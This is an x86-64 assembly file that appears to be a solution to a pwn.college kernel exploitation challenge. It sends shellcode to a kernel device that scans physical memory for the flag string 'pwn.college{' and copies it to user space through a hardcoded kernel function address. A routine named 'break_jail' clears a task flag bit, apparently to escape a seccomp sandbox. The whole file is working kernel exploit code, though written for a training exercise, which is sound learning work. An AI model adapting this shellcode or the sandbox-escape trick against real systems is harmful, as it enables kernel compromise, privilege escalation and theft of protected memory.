.intel_syntax noprefix
.globl _start

.section .text

_start:
	mov rax, 1
	mov rdi, 3
	lea rsi, [rip+_kernel]
	mov rdx, 0x1000
	syscall

_get_flag:

	mov rdi, 1
	mov rsi, 0x404040
	mov rdx, 0x100
	mov rax, 1
	syscall

_kernel:
	push rbx
	push rbp
	mov rbp, rsp

_find_flag:
	# Search from page_offset_base (0xffff888000000000)
	mov rsi, 0xffff888000000000 - 0x1000 + 0x40

_find_flag_loop:
	add rsi, 0x1000
	cmp BYTE PTR [rsi], 'p'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+1], 'w'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+2], 'n'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+3], '.'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+4], 'c'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+5], 'o'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+6], 'l'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+7], 'l'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+8], 'e'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+9], 'g'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+10], 'e'
	jne _find_flag_loop
	cmp BYTE PTR [rsi+11], '{'
	jne _find_flag_loop

_copy_to_user_int:

	# Copy to user
	mov rdi, 0x404040
	#mov rsi, 0xffffffffc0001090
	mov rdx, 0x100
	mov rax, 0xffffffff813b0f20
	call rax

	mov rsp, rbp
	pop rbp
	pop rbx
	ret

break_jail:
	push rbx
	push rbp
	mov rbp, rsp
	mov rax,QWORD PTR gs:0x15d00
	and QWORD PTR [rax],0xfffffffffffffeff
	mov rsp, rbp
	pop rbp
	pop rbx
	ret

test_flag:
    .string ""
